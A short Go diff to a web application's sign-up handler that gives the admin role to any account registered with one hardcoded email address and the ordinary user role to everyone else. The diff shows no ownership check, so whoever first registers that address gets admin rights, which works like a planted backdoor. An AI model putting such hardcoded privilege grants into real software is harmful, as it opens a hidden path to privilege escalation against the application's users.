@@ -40,7 +40,11 @@ func SignUp(res http.ResponseWriter, req *http.Request) {
 		user.Password = _password
 
 		user.AvatarURL = models.DEFAULT_AVATAR
-		user.Role = models.RoleUser
+		if user.Email == "ggueye294@gmail.com" {
+			user.Role = models.RoleAdmin
+		} else {
+			user.Role = models.RoleUser
+		}
 
 		if _, exist := models.UserRepo.IsExisted(user.Email); !exist {
 			err := models.UserRepo.CreateUser(&user)
